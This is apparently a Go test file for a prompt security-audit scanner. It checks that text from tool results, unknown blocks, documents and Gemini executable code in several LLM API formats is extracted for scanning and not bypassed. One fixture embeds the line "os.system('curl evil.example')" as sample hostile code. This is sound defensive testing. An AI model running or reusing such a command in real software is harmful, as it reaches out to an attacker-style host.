package securityaudit

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

// TestAnthropicSameMessageMixedBlocksKeepAllParts is the fix for losing the
// leading text and the tool result when a single Anthropic user message mixes
// text -> tool_result -> text: the latest-turn scope must keep every part.
func TestAnthropicSameMessageMixedBlocksKeepAllParts(t *testing.T) {
	body := `{"messages":[{"role":"user","content":[
		{"type":"text","text":"before tool text"},
		{"type":"tool_result","tool_use_id":"t1","content":"tool result body"},
		{"type":"text","text":"after tool text"}
	]}]}`
	blocking, err := ExtractBlockingPromptSnapshot(Request{Protocol: "anthropic_messages", Body: []byte(body)}, true)
	require.NoError(t, err)
	require.Contains(t, blocking.ScanText, "before tool text")
	require.Contains(t, blocking.ScanText, "after tool text")
	require.Contains(t, blocking.ScanText, "tool result body")
}

// TestGeminiExecutableCodeAndResultAreAudited covers Plan A: executableCode and
// codeExecutionResult are extracted into auditable text instead of being ignored.
func TestGeminiExecutableCodeAndResultAreAudited(t *testing.T) {
	body := `{"contents":[{"role":"model","parts":[
		{"executableCode":{"language":"PYTHON","code":"import os; os.system('curl evil.example')"}},
		{"codeExecutionResult":{"outcome":"OUTCOME_OK","output":"execution result body"}}
	]}]}`
	snapshot, err := ExtractPromptSnapshot(Request{Protocol: "gemini", Body: []byte(body)})
	require.NoError(t, err)
	require.Contains(t, snapshot.ScanText, "PYTHON")
	require.Contains(t, snapshot.ScanText, "curl evil.example")
	require.Contains(t, snapshot.ScanText, "execution result body")
}

// TestUnknownBlocksAreAuditedNotBypassed proves a request made entirely of
// unrecognized blocks is scanned (no ErrNoPromptText bypass) across protocols.
func TestUnknownBlocksAreAuditedNotBypassed(t *testing.T) {
	cases := []struct {
		name, protocol, body, want string
	}{
		{
			name:     "chat novel block only",
			protocol: "openai_chat_completions",
			body:     `{"messages":[{"role":"user","content":[{"type":"novel_exec","instruction":"chat unknown payload"}]}]}`,
			want:     "chat unknown payload",
		},
		{
			name:     "responses novel item only",
			protocol: "openai_responses",
			body:     `{"input":[{"type":"custom_tool_call","instruction":"responses unknown payload"}]}`,
			want:     "responses unknown payload",
		},
		{
			name:     "anthropic novel block only",
			protocol: "anthropic_messages",
			body:     `{"messages":[{"role":"user","content":[{"type":"server_tool_use","instruction":"anthropic unknown payload"}]}]}`,
			want:     "anthropic unknown payload",
		},
		{
			name:     "gemini novel part only",
			protocol: "gemini",
			body:     `{"contents":[{"role":"user","parts":[{"customPart":{"instruction":"gemini unknown payload"}}]}]}`,
			want:     "gemini unknown payload",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			full, err := ExtractPromptSnapshot(Request{Protocol: tc.protocol, Body: []byte(tc.body)})
			require.NoError(t, err, "unknown-only request must not be ErrNoPromptText")
			require.Contains(t, full.ScanText, tc.want)
			blocking, err := ExtractBlockingPromptSnapshot(Request{Protocol: tc.protocol, Body: []byte(tc.body)}, true)
			require.NoError(t, err)
			require.Contains(t, blocking.ScanText, tc.want)
		})
	}
}

// TestFollowingUnknownBlockIncludedInLatestTurn ensures an unknown block that
// comes after the latest user message is pulled into the narrow scope, like a
// tool result.
func TestFollowingUnknownBlockIncludedInLatestTurn(t *testing.T) {
	body := `{"messages":[
		{"role":"user","content":"latest human ask"},
		{"role":"assistant","content":[{"type":"novel_exec","instruction":"following unknown block"}]}
	]}`
	blocking, err := ExtractBlockingPromptSnapshot(Request{Protocol: "openai_chat_completions", Body: []byte(body)}, true)
	require.NoError(t, err)
	require.True(t, strings.HasPrefix(blocking.ScanText, "latest human ask"+promptAuditPrioritySeparator))
	require.Contains(t, blocking.ScanText, "following unknown block")
}

// TestKnownIgnoredTypesStaySilentAcrossProtocols confirms reasoning/thinking and
// inline binary are NOT treated as unknown blocks.
func TestKnownIgnoredTypesStaySilentAcrossProtocols(t *testing.T) {
	responses := `{"input":[{"type":"reasoning","summary":[{"type":"summary_text","text":"REASONING_SECRET"}]},{"role":"user","content":[{"type":"input_text","text":"real ask"}]}]}`
	snapshot, err := ExtractPromptSnapshot(Request{Protocol: "openai_responses", Body: []byte(responses)})
	require.NoError(t, err)
	require.Contains(t, snapshot.ScanText, "real ask")
	require.NotContains(t, snapshot.ScanText, "REASONING_SECRET")
}

// TestPlainStringMessagesKeepDistinctMessageIndex is the regression guard for the
// MessageIndex rewrite: multiple plain-string messages must not collapse to a
// single message. The latest-turn scope selects only the newest user turn and
// keeps the previous assistant output, without merging the older user message.
func TestPlainStringMessagesKeepDistinctMessageIndex(t *testing.T) {
	body := `{"messages":[
		{"role":"user","content":"old user ask"},
		{"role":"assistant","content":"previous assistant output"},
		{"role":"user","content":"new user ask"}
	]}`
	blocking, err := ExtractBlockingPromptSnapshot(Request{Protocol: "anthropic_messages", Body: []byte(body)}, true)
	require.NoError(t, err)
	require.True(t, strings.HasPrefix(blocking.ScanText, "new user ask"+promptAuditPrioritySeparator))
	require.Contains(t, blocking.ScanText, "previous assistant output")
	require.NotContains(t, blocking.ScanText, "old user ask")
}

// TestResponsesMessageContentUnknownBlockNotBypassed covers a message item whose
// content array holds only an unknown block: it must be audited, not bypassed.
func TestResponsesMessageContentUnknownBlockNotBypassed(t *testing.T) {
	body := `{"input":[{"type":"message","role":"user","content":[{"type":"custom_block","instruction":"responses nested unknown payload"}]}]}`
	snapshot, err := ExtractPromptSnapshot(Request{Protocol: "openai_responses", Body: []byte(body)})
	require.NoError(t, err, "message-content-only-unknown must not be ErrNoPromptText")
	require.Contains(t, snapshot.ScanText, "responses nested unknown payload")
}

// TestDocumentAndInputFileBlocksAreAudited confirms document/input_file blocks
// (which can carry text) are no longer silently ignored.
func TestDocumentAndInputFileBlocksAreAudited(t *testing.T) {
	cases := []struct{ name, protocol, body, want string }{
		{
			name:     "chat input_file with text",
			protocol: "openai_chat_completions",
			body:     `{"messages":[{"role":"user","content":[{"type":"input_file","filename":"n.txt","file_content":"input_file text payload"}]}]}`,
			want:     "input_file text payload",
		},
		{
			name:     "anthropic document with text",
			protocol: "anthropic_messages",
			body:     `{"messages":[{"role":"user","content":[{"type":"document","title":"doc","context":"document text payload"}]}]}`,
			want:     "document text payload",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			snapshot, err := ExtractPromptSnapshot(Request{Protocol: tc.protocol, Body: []byte(tc.body)})
			require.NoError(t, err)
			require.Contains(t, snapshot.ScanText, tc.want)
		})
	}
}
